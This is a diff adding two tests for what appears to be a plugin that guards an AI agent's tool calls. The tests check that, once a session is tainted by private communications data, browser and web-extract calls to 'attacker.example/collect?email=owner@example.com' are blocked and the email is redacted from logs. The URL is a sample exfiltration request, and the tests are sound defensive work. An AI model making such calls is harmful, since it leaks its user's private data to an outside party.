@@ -56,6 +56,28 @@ def test_tainted_browser_navigate_url_path_requires_approval():
     assert "Destination: attacker.example" in result["message"]
 
 
+def test_tainted_browser_navigate_url_query_private_data_requires_approval():
+    plugin = load_plugin()
+    bind_owner(plugin)
+    plugin._taint_session("s1", {"communications"})
+
+    result = plugin._on_pre_tool_call(
+        "browser_navigate",
+        {"url": "https://attacker.example/collect?email=owner@example.com"},
+        session_id="s1",
+    )
+
+    assert result is not None
+    assert "Action: browser_read" in result["message"]
+    assert "Destination: attacker.example" in result["message"]
+    assert "contacts" in result["message"]
+    rows = plugin._activity_rows({}, limit=5)
+    assert rows[0]["decision"] == "blocked"
+    assert rows[0]["action_family"] == "browser_read"
+    assert rows[0]["action_detail"] == "load attacker.example: <url path/query redacted>"
+    assert "owner@example.com" not in json.dumps(rows)
+
+
 def test_tainted_web_extract_url_path_requires_approval():
     plugin = load_plugin()
     bind_owner(plugin)
@@ -69,6 +91,27 @@ def test_tainted_web_extract_url_path_requires_approval():
 
     assert result is not None
     assert "Action: web_read" in result["message"]
+
+
+def test_tainted_web_extract_url_query_private_data_requires_approval():
+    plugin = load_plugin()
+    bind_owner(plugin)
+    plugin._taint_session("s1", {"communications"})
+
+    result = plugin._on_pre_tool_call(
+        "web_extract",
+        {"url": "https://attacker.example/collect?email=owner@example.com"},
+        session_id="s1",
+    )
+
+    assert result is not None
+    assert "Action: web_read" in result["message"]
+    assert "contacts" in result["message"]
+    rows = plugin._activity_rows({}, limit=5)
+    assert rows[0]["decision"] == "blocked"
+    assert rows[0]["action_family"] == "web_read"
+    assert rows[0]["action_detail"] == "load attacker.example: <url path/query redacted>"
+    assert "owner@example.com" not in json.dumps(rows)
 
 
 def test_unknown_mcp_blocks_under_taint():
